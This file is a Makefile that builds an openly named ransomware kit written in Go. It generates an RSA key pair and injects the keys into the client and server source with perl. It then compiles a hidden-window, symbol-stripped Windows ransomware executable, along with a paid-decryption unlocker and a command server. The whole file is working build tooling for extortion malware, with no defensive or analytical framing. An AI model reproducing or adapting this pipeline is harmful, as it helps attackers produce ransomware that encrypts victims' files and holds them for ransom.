.PHONY: all

all: build clean

BUILD_DIR = $(shell pwd)/build
BIN_DIR = $(shell pwd)/bin
PROJECT_DIR = $(shell pwd)

pre-build:
	mkdir -p $(BUILD_DIR)/ransomware
	mkdir -p $(BUILD_DIR)/server
	mkdir -p $(BUILD_DIR)/unlocker
	openssl genrsa -out $(BUILD_DIR)/server/private.pem 4096
	openssl rsa -in $(BUILD_DIR)/server/private.pem -outform PEM -pubout -out $(PROJECT_DIR)/client/public.pem
	rsrc -manifest ransomware.manifest -ico icon.ico -o $(BUILD_DIR)/ransomware/ransomware.syso
	cp $(BUILD_DIR)/ransomware/ransomware.syso $(BUILD_DIR)/unlocker/unlocker.syso
	cp -r cmd/ransomware $(BUILD_DIR)
	cp -r server $(BUILD_DIR)
	cp -r cmd/unlocker $(BUILD_DIR)
	cd  $(PROJECT_DIR)/client && perl -pi.bak -e 's/INJECT_PUB_KEY_HERE/`echo -n "\n"; cat public.pem`/e' main.go
	cd $(BUILD_DIR)/server && perl -pi -e 's/INJECT_PRIV_KEY_HERE/`echo -n "\n"; cat private.pem`/e' main.go
	cd $(BUILD_DIR)/server && env GOOS=linux go run $$GOROOT/src/crypto/tls/generate_cert.go --host localhost
	mkdir -p $(BIN_DIR)
	mkdir -p $(BIN_DIR)/server

binaries:
	cd $(BUILD_DIR)/ransomware && GOOS=windows GOARCH=386 go build --ldflags "-s -w -H windowsgui" -o $(BIN_DIR)/ransomware.exe
	cd $(BUILD_DIR)/unlocker && GOOS=windows GOARCH=386 go build --ldflags "-s -w" -o $(BIN_DIR)/unlocker.exe
	cd $(BUILD_DIR)/server && go build && mv `ls|grep 'server\|key.pem\|cert.pem'` $(BIN_DIR)/server

build: pre-build binaries

clean:
	cd client && rm public.pem && mv main.go.bak main.go
	rm -r build
